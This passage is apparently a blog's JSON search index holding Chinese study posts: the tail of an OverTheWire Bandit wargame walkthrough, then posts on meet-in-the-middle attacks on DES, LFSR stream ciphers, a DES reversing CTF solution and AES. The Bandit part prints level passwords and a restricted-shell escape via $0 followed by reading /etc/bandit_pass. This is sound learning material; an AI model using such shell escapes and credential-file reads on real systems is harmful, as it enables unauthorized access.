-4,5 +4,5 @@ Some notes for level29 of bandit. ## credentials - username: bandit29-- password: bbc96594b4e001778eee9975372716b2+- password: xxxxxxxxxx Level_29➡Level_30Learn about branch of git:官方文档：yyds :)阅读官方文档的时候英语的作用就体现出来了 12345678910111213141516171819202122232425262728293031323334353637383940bandit29@bandit:/tmp/what_a_fuck/repo$ git branch -a #查看所有分支* master remotes/origin/HEAD -&gt; origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-devbandit29@bandit:/tmp/what_a_fuck/repo$ git checkout dev #切换到其他分支Switched to branch &#x27;dev&#x27;bandit29@bandit:/tmp/what_a_fuck/repo$ git logcommit bc833286fca18a3948aec989f7025e23ffc16c07Author: Morla Porla &lt;morla@overthewire.org&gt;Date: Thu May 7 20:14:52 2020 +0200 add data needed for development #该分支下可能有flagcommit 8e6c203f885bd4cd77602f8b9a9ea479929ffa57Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:51 2020 +0200 add gif2asciicommit 208f463b5b3992906eabf23c562eda3277fea912Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:51 2020 +0200 fix usernamecommit 18a6fd6d5ef7f0874bbdda2fa0d77b3b81fd63f7Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:51 2020 +0200 initial commit of README.mdbandit29@bandit:/tmp/what_a_fuck/repo$ cat README.md #查看READM.md# Bandit NotesSome notes for bandit30 of bandit.## credentials- username: bandit30- password: 5b90576bedb2cc04c86a9e924ce42faf Level_30➡Level_31Learn about the git show1git show-ref #显示所有本地库储存的所有可能的引用以及关联的提醒 1234563aa4c239f729b07deb99a52f125893e162daac9e refs/heads/master3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/HEAD3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/masterf17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secretgit show f171即可get flag47e603bb428404d265f59c42920d81e5 Level_31➡Level_32Learn about push and commit of git1234567bandit31@bandit:/tmp/sanshiyiguan/repo$ cat README.md This time your task is to push a file to the remote repository.Details: File name: key.txt Content: &#x27;May I come in?&#x27; Branch: master 查看信息应该是让我们用master分支把包含’May I come in?’的key.txt提交到远程仓库 vim 编辑该文档然后添加 1git add key.txt -f 关于 commit 1git commit -m &quot;wuhu~I_got_it&quot; The last step: 1git push 12remote: Well done! Here is the password for the next level:remote: 56a9bf19c63d650ce78e6ec0354ee45e Level_32➡Level_33Analyse: 1234&gt;&gt; lssh: 1: LS: not found&gt;&gt; whoamish: 1: WHOAMI: not found 登录后弹出一个大写的SHELL终端，测试发现我们所有的命令都会被转换为大写。 根据Tips: sh 和 man 查阅man sh文档 找到了一些信息，可以用$0 12345Expands to the name of the shell or shell script. This is set at shell initialization. If bash is invoked with a file of commands, $0 is set to the name of that file. If bash is started with the -c option, then $0 is set to the first argument after the string to be executed, if one is present. Otherwise, it is set to the file name used to invoke bash, as given by argument zero. What’s $01In bash, $n (where “n” represents a number), refers to the nth argument of a command call. $1 would be the first parameter, $2 the second, and so forth. $0 refers to the command itself. As we figured out above that our input is passed on to an sh call, $0 will be referencing sh itself, starting a new shell (without the UPPERCASE mechanics). 12$ cat /etc/bandit_pass/bandit33c9c3199ddf4121b10cf581a98d51caee Summary题目非常平易近人，引导着学习基本Linux命令、linux文件、用户管理等、Git命令等知识。","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"中间相遇攻击分析","slug":"cryp_中间相遇攻击","date":"2021-04-06T17:24:39.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/04/07/cryp_中间相遇攻击/","link":"","permalink":"http://example.com/2021/04/07/cryp_%E4%B8%AD%E9%97%B4%E7%9B%B8%E9%81%87%E6%94%BB%E5%87%BB/","excerpt":"","text":"中间相遇攻击 - MITMWhat’s MITM中间相遇攻击(Meet-in-the-middle attack):中间相遇攻击是一种以空间换取时间的一种攻击方法，1977 年由 Diffie 与 Hellman 提出。从个人角度看，这更多地指一种思想，不仅仅适用于密码学攻击，也适用于其他方面，可以降低算法的复杂度。 基本原理假设 E 和 D 分别是加密函数和解密函数，k1 和 k2 分别是两次加密使用的密钥，则我们有： C=E_{k2}(E_{k1}(P)) P=D_{k2}(D_{k1}(C))则我们可以推出 E_{k1}(P)=D_{k2}(C)那么，当用户知道一对明文和密文时 攻击者可以枚举所有的 k1，将 P 所有加密后的结果存储起来，并按照密文的大小进行排序。 攻击者进一步枚举所有的 k2，将密文 C 进行解密得到 C1，在第一步加密后的结果中搜索 C1，如果搜索到，则我们在一定程度上可以认为我们找到了正确的 k1 和 k2。 如果觉得第二步中得到的结果不保险，则我们还可以再找一些明密文对进行验证。 下面以双重DES、三重DES为例进行中间相遇分析 Double-DES_Analyse总密钥长度一共2×56位 穷举搜索复杂度： 2^{112}下面考虑中间相遇攻击复杂度分析： 对于给定明文P，密文C，密钥K1,K2： E_{k1}(P)=D_{k2}(C)=M 首先P按照所有可能的k1进行加密得到M，可以得到2^{64}个结果，将结果按序存放一个表中然后将C用所有可能的密钥K2解密，每解密一次，将解密结果与表中的值比较，如果由相等的，就将刚才测试的两个密钥对一个新的明密文对进行验证，若验证成功，则认定这两个密钥对是正确的密钥。 结论：中间相遇攻击使用两组已知明密文对就可以猜出正确的密钥，其时间复杂度是2^56，比单重DES所需的2^55次方多不了多少。 Treple-DES_Analyse3TDEA 三密钥三重DES： C=E_{k3}(E_{k2}(E_{k1}(P))) P=D_{k3}(D_{k2}(D_{k1}(C))) 穷举攻击复杂度:2^{56×3}下面考虑中间相遇攻击： D_{k3}(C)=E_{k2}(E_{k1}(P))=M同理：穷举k3解密C得到表项，穷举k1,k2解密P共2^{112}种可能 三密钥三重DES中间相遇攻击是有效的 2TDEA 双密钥三重DES： C=E_{k1}(D_{k2}(E_{k1}(P))) P=D_{k1}(E_{k2}(D_{k1}(C))) 穷举攻击复杂度：2^{56×2}下面考虑中间相遇攻击： D_{k1}(C)=D_{k2}(E_{k1}(P))=M同理：穷举k1解密C得到表项，穷举k1,k2解密P共2^{112}种可能 与穷举攻击复杂度一样，因此对于双密钥三重DES，我们可以认为中间相遇攻击是无效的。 CTF_对应题目 2018 国赛 Crackmec，参见 Wiki AES 部分 2018 Plaid CTF Transducipher，参见比特攻击部分的原理。 2018 国赛 Crackme java，参见 Wiki 整数域上的离散对数部分 2018 WCTF RSA，参见 wiki RSA Complex 部分","categories":[{"name":"cryptography","slug":"cryptography","permalink":"http://example.com/categories/cryptography/"}],"tags":[{"name":"MITM","slug":"MITM","permalink":"http://example.com/tags/MITM/"},{"name":"triple-DES","slug":"triple-DES","permalink":"http://example.com/tags/triple-DES/"},{"name":"double-DES","slug":"double-DES","permalink":"http://example.com/tags/double-DES/"}]},{"title":"流密码","slug":"cryp_流密码","date":"2021-04-01T17:24:39.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/04/02/cryp_流密码/","link":"","permalink":"http://example.com/2021/04/02/cryp_%E6%B5%81%E5%AF%86%E7%A0%81/","excerpt":"","text":"流密码基本概念流密码一般逐字节或者逐比特处理信息。 特点： 流密码的密钥长度会与明文的长度相同。 流密码的密钥派生自一个较短的密钥，派生算法通常为一个伪随机数生成算法。 类型：对称加密。 伪随机数生成算法生成的序列的随机性越强，明文中的统计特征被覆盖的更好。 流密码加解密非常简单，在已知明文的情况下，可以非常容易地获取密钥流。 流密码的关键在于设计好的伪随机数生成器。一般来说，伪随机数生成器的基本构造模块为反馈移位寄存器。当然，也有一些特殊设计的流密码，比如 RC4。 基于LFSR的PRG线性反馈移位寄存器LFSR概念：线性反馈移位寄存器是指有n个寄存器（称为n-级移位寄存器）R1,R2,…,Rn从右到左排列，每个寄存器中能存放1位二进制数，所有寄存器中的数可以统一向右（或向左）移动1位，称为进动1拍. 即R1的值(b1)右移1位后输出，然后R2的值(b2)送R1 , R3的值(b3)送R2,……最后，Rn的值(bn)送Rn-1. LFSR运行基本操作： 初始化。首先，LFSR会以给定的种子（即密钥）初始化寄存器，以位（比特）为单位： 2. 抽头。随后，LFSR从这些比特位中随机选取一些（称作“抽头”），并计算这些抽头的异或： 3. 位移并附加。最后，LFSR将这些抽头异或的结果附加到寄存器开头，并使寄存器向右位移，最后一个比特位作为结果输出： 初始化寄存器后，每个时钟周期LFSR将执行重复上边这些步骤，选取一些抽头，将它们异或，随后寄存器右移输出最右一位并将异或结果附加到寄存器开头。 Math_Analyse：线性反馈移位寄存器的反馈函数一般如下 a_{i+n}={\\sum_{j=1}^{n}c_ja_{i+n-j}} 其中，c_j 均在某个有限域 F_q 中。既然线性空间是一个线性变换，我们可以得知这个线性变换为 进而，我们可以求得其特征多项式为 f(x)=x^n−{\\sum_{i=1}^{n}(c_ix^i)}同时，我们定义其互反多项式为 \\overline{f_{(x)}}=1-x^nf(\\frac{1}{x})我们也称互反多项式为线性反馈移位寄存器的联结多项式。 特征多项式和生成函数特征多项式 P(x)=1+c_1x+c_2x^2+...+c_nx^n序列周期与生成函数序列的的周期为其生成函数的既约真分式的分母的周期。 对于 n 级线性反馈移位寄存器，最长周期为 2^n−1（排除全零）。达到最长周期的序列一般称为 m 序列。 将两个序列累加得到新的序列的周期为这两个序列的周期的和。 序列是 n 级 m 序列，当且仅当序列的极小多项式是 n 次本原多项式。","categories":[{"name":"cryptography","slug":"cryptography","permalink":"http://example.com/categories/cryptography/"}],"tags":[{"name":"流密码","slug":"流密码","permalink":"http://example.com/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"}]},{"title":"DES逆向分析","slug":"cryp_DES逆向","date":"2021-03-30T17:24:39.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/03/31/cryp_DES逆向/","link":"","permalink":"http://example.com/2021/03/31/cryp_DES%E9%80%86%E5%90%91/","excerpt":"","text":"DES加密过程回顾DES是一个分组加密算法，典型的DES以64位为分组对数据加密，加密和解密用的是同一个算法。整个DES加密过程，可以大致分为如下几个阶段： 初始置换、生成子密钥、迭代过程、最后逆置换 （其中迭代过程包括：扩展置换E、S盒代替、P盒置换） 初始IP置换： 加密开始时，对输入的长度为64位的明文，进行初始置换 IPIP。其置换方式如下图中 8×88×8 的表格所示： 58 50 42 34 26 18 10 2 60 52 44 36 28 20 12 4 62 54 46 38 30 22 14 6 64 56 48 40 32 24 16 8 57 49 41 33 25 17 9 1 59 51 43 35 27 19 11 3 61 53 45 37 29 21 13 5 63 55 47 39 31 23 15 7 即：表中的数字代表新数据中此位置的数据在原数据中的位置，即原数据块的第58位放到新数据的第1位 子密钥生成： DES 加密共执行16次迭代，每次迭代过程的数据长度为48位，因此需要16个48位的子密钥来进行加密，生成子密钥的过程如下： 迭代过程： E扩展： 32 1 2 3 4 5 4 5 6 7 8 9 8 9 10 11 12 13 12 13 14 15 16 17 16 17 18 19 20 21 20 21 22 23 24 25 24 25 26 27 28 29 28 29 30 31 32 1 经过 E扩展 的变换，结果中的各位，依次为输入的第32, 1, 2, …, 32, 1位。可以看到，输入的有些位，在输出中重复出现了。所以输出的位数，由输入时的32，增加到了48。 S盒替换： E扩展得到的结果仍然是48位的。将其每6位编为一组，共8组记为： B_{1}B_{2}B_{3}B_{4}B_{5}B_{6}B_{7}B_{8}然后，对每一个 Bi，使用对应的S-box进行变换，并将结果继续拼接起来。 对于长度为6位的输入，根据其第1, 6位确定所在行，再根据其第2至5位确定所在列，找到对应的值，即为sbox的输出结果。 S1 x0000x x0001x x0010x x0011x x0100x x0101x x0110x x0111x x1000x x1001x x1010x x1011x x1100x x1101x x1110x x1111x 0yyyy0 14 4 13 1 2 15 11 8 3 10 6 12 5 9 0 7 0yyyy1 0 15 7 4 14 2 13 1 10 6 12 11 9 5 3 8 1yyyy0 4 1 14 8 13 6 2 11 15 12 9 7 3 10 5 0 1yyyy1 15 12 8 2 4 9 1 7 5 11 3 14 10 0 6 13 ，如果输入是 011011，那么其变换的结果是在第2行，倒数第3列，值为5=0101。所以： S_{1}(011011)=0101对于这8个 Bi，通过 SiSi 全部计算完成后再拼接，得到长度为32位的结果： P盒置换： 16 7 20 21 29 12 28 17 1 15 23 26 5 18 31 10 2 8 24 14 32 27 3 9 19 13 30 6 22 11 4 25 表中的数字代表原数据中此位置的数据在新数据中的位置，即原数据块的第16位放到新数据的第1位，第7位放到第2位，……依此类推，第25位放到第32位。 最后IP逆置换： 40 8 48 16 56 24 64 32 39 7 47 15 55 23 63 31 38 6 46 14 54 22 62 30 37 5 45 13 53 21 61 29 36 4 44 12 52 20 60 28 35 3 43 11 51 19 59 27 34 2 42 10 50 18 58 26 33 1 41 9 49 17 57 25 以上是对DES加密算法的简单回顾 下面我们以desenc.exe为实例对DES加密函数进行具体分析 运行该小程序后发现我们需要输入一个被加密的字符串，测试后发现，我们输入某个正确的八位字符串即可获取flag. 下面借助IDA对其中的关键函数进行分析： main函数分析 首先借助IDA的F5反编译插件查看main函数伪代码，获取加密大致流程： 首先字符串”DE3_En1c”被放入v7字符数组中，根据其为8字节共64bit而且此程序为加密函数可以分析出v7字符数组应该储存的是密钥 其次获取用户输入并将用户输入储存在Str字符数组中，判断此为明文输入 接着对用户输入长度进行判断，若用户输入字符长度为8则进入加密子程序 sub_40100F((int)v7)根据该函数处理的数据为密钥v7,猜测此函数为密钥生成函数 sub_401032(Str, v5);根据输入参数可以猜测此函数对用户输入进行加密并将加密后密文储存在v5字符数组中 最后将密文同指定的字符数组进行比较，若一致则最终可以get flag 下面对子密钥生成模块和加密迭代过程模块过程进行重点分析： DES子密钥生成模块分析sub_40100F((int)v7)跟进该函数： sub_40101E(a1, v6, 8)分析 该函数参数为a1,v6,8 该函数将固定的数据a1作为参数处理，将结果储存在栈空间v6中。 该函数取参数中每一字节数据的每一位，并将每一位数据再放入一个字节中。 result = (void *)sub_401046(v6, v4);分析 跟进函数sub_401046(v6, v4) 该函数利用栈中数据v6作为参数进行56轮的处理，每一轮循环都是根据字节 数组0x4280EC处的值来将v6中的数据放入输出地址a2处， 经过该函数，输入的64字节数据变成了56字节数据，这是子密钥生成算法的的第一步PC-1置换选择 接下来应该是两部分子密钥进行循环左移的过程 sub_401014(v4, (int)v4, byte_428154[i]);分析： 函数sub_4014F0就是循环移位的函数，分别对 56位密钥中的左右两个子密钥进行移位。 经过16轮循环生成16组子密钥 DES加密模块分析sub_401032(Str, v5) 跟进该函数 sub_40101E(a1, (int)Src, 8)分析： 该函数同子密钥生成模块第一个函数一样：将用户的输入中的每一位提取出来转换成一个64字节的数组； sub_401028(Src, (int)Src);分析 跟进该函数： 该部分0对这64字节数组进行处理，即加密过程中的IP置换； 两次memcpy调用分析： 跟进函数结合DES过程分析这部分分成了左右两个分组 十六轮循环迭代部分： for循环完成前十五轮迭代 for循环后完成最后一轮迭代 sub_401005((int)v3, v5, (int)&amp;unk_42DC9C + 48 * i);分析： sub_40104B(a1, (int)v5) 1234567891011121314unsigned __int8 __cdecl sub_401660(void *Src, int a2)&#123; unsigned __int8 result; // al int i; // [esp+4Ch] [ebp-34h] char v4[48]; // [esp+50h] [ebp-30h] BYREF result = (unsigned __int8)memcpy(v4, Src, sizeof(v4)); for ( i = 0; i &lt; 48; ++i ) &#123; result = *((_BYTE *)&amp;i + byte_42809C[i] + 3); *(_BYTE *)(i + a2) = result; &#125; return result;&#125; a1为一个32字节的数据，v5则是分配的栈上的 空间，大小为0x30（48）字节，跟进该函数可知这部分为E扩展 sub_401023(v5, a3, 48)函数: 1234567891011int __cdecl sub_401900(int a1, int a2, int a3)&#123; int result; // eax int i; // [esp+4Ch] [ebp-4h] for ( i = 0; i &lt; a3; ++i ) &#123; *(_BYTE *)(i + a1) = (*(_BYTE *)(i + a2) + *(_BYTE *)(i + a1)) &amp; 1; result = i + 1; &#125; return result; 该函数将第一个参数和第二个参数逐字节的相加，并将结果‘与’ 上0x1（也即取最低位），这其实就是异或的操作， 也是标准DES加密过程中右边分组经扩展置换后与 密钥进行异或的部分 sub_40103C(v5, Src) 1234567891011121314151617181920212223int __cdecl sub_4016F0(int a1, int a2)&#123; int result; // eax char v3; // [esp+4Ch] [ebp-14h] int v4; // [esp+58h] [ebp-8h] int v5; // [esp+5Ch] [ebp-4h] v5 = 0; v4 = 0; while ( v5 &lt; 8 ) &#123; v3 = byte_428164[64 * v5 + 16 * ((*(_BYTE *)(a1 + 6 * v5 + 5) | (unsigned __int8)(2 * *(_BYTE *)(a1 + 6 * v5))) &amp; 3) + ((*(_BYTE *)(a1 + 6 * v5 + 4) | (unsigned __int8)((2 * *(_BYTE *)(a1 + 6 * v5 + 3)) | (4 * *(_BYTE *)(a1 + 6 * v5 + 2)) | (8 * *(_BYTE *)(a1 + 6 * v5 + 1)))) &amp; 0xF)] &amp; 0xF; *(_BYTE *)(v4 + a2) = (v3 &gt;&gt; 3) &amp; 1; *(_BYTE *)(v4 + a2 + 1) = (v3 &gt;&gt; 2) &amp; 1; *(_BYTE *)(v4 + a2 + 2) = (v3 &gt;&gt; 1) &amp; 1; *(_BYTE *)(v4 + a2 + 3) = v3 &amp; 1; v4 += 4; result = ++v5; &#125; return result;&#125; 根据迭代流程猜测此函数为S-box替换，查表将6bit数据替换为4bit数据 sub_401037(Src, (int)Src) 1234567891011121314unsigned __int8 __cdecl sub_401870(void *Src, int a2)&#123; unsigned __int8 result; // al int i; // [esp+4Ch] [ebp-24h] char v4[32]; // [esp+50h] [ebp-20h] BYREF result = (unsigned __int8)memcpy(v4, Src, sizeof(v4)); for ( i = 0; i &lt; 32; ++i ) &#123; result = *((_BYTE *)&amp;i + byte_4280CC[i] + 3); *(_BYTE *)(i + a2) = result; &#125; return result;&#125; 该函数完成P置换部分 Exp可转化为：已知加密流程为DES，密钥DE3_En1C：，加密后密文，求明文。 123456789101112131415int main()&#123; unsigned char key[9] = &quot;DE3_En1C&quot;; unsigned char plaintext[20]; unsigned char ciphertext[8]=&#123;0xef,0x34,0xd4,0xa3,0xc6,0x84,0xe4,0x23&#125;; //to generate 16 round subkey get_subkey(key); //to encrypt plaintext decryption(ciphertext,plaintext); plaintext[8]=&#x27;\\0&#x27;; printf(&quot;%s\\n&quot;,plaintext); system(&quot;pause&quot;); return 0;&#125; Finally :)","categories":[{"name":"cryptography、逆向","slug":"cryptography、逆向","permalink":"http://example.com/categories/cryptography%E3%80%81%E9%80%86%E5%90%91/"}],"tags":[{"name":"DES、IDA逆向","slug":"DES、IDA逆向","permalink":"http://example.com/tags/DES%E3%80%81IDA%E9%80%86%E5%90%91/"}]},{"title":"AES分析","slug":"cryp_AES","date":"2021-03-27T17:24:39.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/03/28/cryp_AES/","link":"","permalink":"http://example.com/2021/03/28/cryp_AES/","excerpt":"","text":"AES基本介绍Advanced Encryption Standard（AES），高级加密标准，是典型的块加密，被设计来取代 DES，由 Joan Daemen 和 Vincent Rijmen 所设计。其基本信息如下 输入：128 比特。 输出：128 比特。 SPN 网络结构。 过程主要包括字节替代、行移位、列混淆和轮密钥加 其迭代轮数与密钥长度有关系，如下 密钥长度（比特） 迭代轮数 128 10 192 12 256 14 基本流程基本概念在 AES 加解密过程中，每一块都是 128 比特，所以我们这里明确一些基本概念。 在 AES 中，块与 State 之间的转换过程如下 所以，可以看出，每一个 block 中的字节是按照列排列进入到状态数组的。 而对于明文来说，一般我们会选择使用其十六进制进行编码。 加解密过程这里给个看雪上比较好的 图例 ，以便于介绍基本的流程，每一轮主要包括 轮密钥加，AddRoundKey 字节替换，SubBytes 行移位，ShiftRows 列混淆，MixColumns 上面的列混淆的矩阵乘法等号左边的列向量应该在右边。 这里再给一张其加解密的全图，其解密算法的正确性很显然。 我们这里重点关注一下以下。 字节替换在字节替换的背后，其实是有对应的数学规则来定义对应的替换表的，如下 这里的运算均定义GF(2^8)内列混淆 这里的运算也是定义在 GF(2^8) 上，使用的模多项式为 x^8+x^4+x^3+1。密钥扩展 等价解密算法简单分析一下，我们可以发现 交换逆向行移位和逆向字节代替并不影响结果。 交换轮密钥加和逆向列混淆并不影响结果，关键在于 首先可以把异或看成域上的多项式加法 然后多项式中乘法对加法具有分配率。 GF(2^8)上的四则运算加减法： 在GF(2^8)上的加法定义为二进制多项式加法，且其系数模2Demo: 57+83=D4 (x^6+x^4+x^2+x+1)+(x^7+x+1)=x^7+x^6+ x^4+ x^2 (mod m(x))乘除法： 在GF(2^8)中定义的二进制乘积模一个次数为8的不可约多项式 m(x)= x^8+x^4+x^3+x+1Demo: 57*83=C1 (x^6+x^4+x^2+x+1)·(x^7+x+1)=x^7+x^6+1(mod m(x))列混合： 列混合操作等价于以下矩阵乘法： b3​x3+b2​x2+b1​x+b0​=(a3​x3+a2​x2+a1​x+a0​)({03}x3+{01}x2+{01}x+{02}) =(a3​∗03)x6+(a3​∗01+a2​∗03)x5+(a3​∗01+a2​∗01+a1​∗03)x4+(a3​∗02+a2​∗01+a1​∗01+a0​∗03)x3+(a2​∗02+a1​∗01+a0​∗01)x2+(a1​∗02+a0​∗01)x+a0​∗02 =(a3​∗02+a2​∗01+a1​∗01+a0​∗03)x3+(a3​∗03+a2​∗02+a1​∗01+a0​∗01)x2+(a3​∗01+a2​∗03+a1​∗02+a0​∗01)x+(a3​∗01+a2​∗01+a1​∗03+a0​∗02)最终写为矩阵形式即如上图","categories":[{"name":"cryptography","slug":"cryptography","permalink":"http://example.com/categories/cryptography/"}],"tags":[{"name":"AES","slug":"AES","permalink":"http://example.com/tags/AES/"}]},{"title":"Hello World","slug":"hello_world","date":"2021-03-25T17:19:47.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/03/26/hello_world/","link":"","permalink":"http://example.com/2021/03/26/hello_world/","excerpt":"","text":"一个新的开始 “我所有的欲望和沉思，都是这个宇宙缓缓呼出的气流。在这漫长的呼气结束之前，我的思维将一直存在。” ​ 几经周折终于面前搭建好了属于自己的博客，一个属于自己的空间。长久以来，我与外界的关系是作为一个消费者，消费物质和内容。2021年希望自己可以做一个生产者，创作者，把博客作为方法，输出和记录一些内容。 :) Hello world.","categories":[{"name":"my_space","slug":"my-space","permalink":"http://example.com/categories/my-space/"}],"tags":[{"name":"say_something","slug":"say-something","permalink":"http://example.com/tags/say-something/"}]}],"categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"},{"name":"Web","slug":"Web","permalink":"http://example.com/categories/Web/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"},{"name":"Python","slug":"Python","permalink":"http://example.com/categories/Python/"},{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"},{"name":"cryptography","slug":"cryptography","permalink":"http://example.com/categories/cryptography/"},{"name":"cryptography、逆向","slug":"cryptography、逆向","permalink":"http://example.com/categories/cryptography%E3%80%81%E9%80%86%E5%90%91/"},{"name":"my_space","slug":"my-space","permalink":"http://example.com/categories/my-space/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"FormatString","slug":"FormatString","permalink":"http://example.com/tags/FormatString/"},{"name":"Rop","slug":"Rop","permalink":"http://example.com/tags/Rop/"},{"name":"ELF文件","slug":"ELF文件","permalink":"http://example.com/tags/ELF%E6%96%87%E4%BB%B6/"},{"name":"Web","slug":"Web","permalink":"http://example.com/tags/Web/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"PE文件","slug":"PE文件","permalink":"http://example.com/tags/PE%E6%96%87%E4%BB%B6/"},{"name":"编译过程","slug":"编译过程","permalink":"http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"},{"name":"链接","slug":"链接","permalink":"http://example.com/tags/%E9%93%BE%E6%8E%A5/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"},{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"程序保护机制","slug":"程序保护机制","permalink":"http://example.com/tags/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"name":"堆溢出","slug":"堆溢出","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-21220","slug":"CVE-2021-21220","permalink":"http://example.com/tags/CVE-2021-21220/"},{"name":"CVE-2021-3156","slug":"CVE-2021-3156","permalink":"http://example.com/tags/CVE-2021-3156/"},{"name":"MITM","slug":"MITM","permalink":"http://example.com/tags/MITM/"},{"name":"triple-DES","slug":"triple-DES","permalink":"http://example.com/tags/triple-DES/"},{"name":"double-DES","slug":"double-DES","permalink":"http://example.com/tags/double-DES/"},{"name":"流密码","slug":"流密码","permalink":"http://example.com/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"},{"name":"DES、IDA逆向","slug":"DES、IDA逆向","permalink":"http://example.com/tags/DES%E3%80%81IDA%E9%80%86%E5%90%91/"},{"name":"AES","slug":"AES","permalink":"http://example.com/tags/AES/"},{"name":"say_something","slug":"say-something","permalink":"http://example.com/tags/say-something/"}]}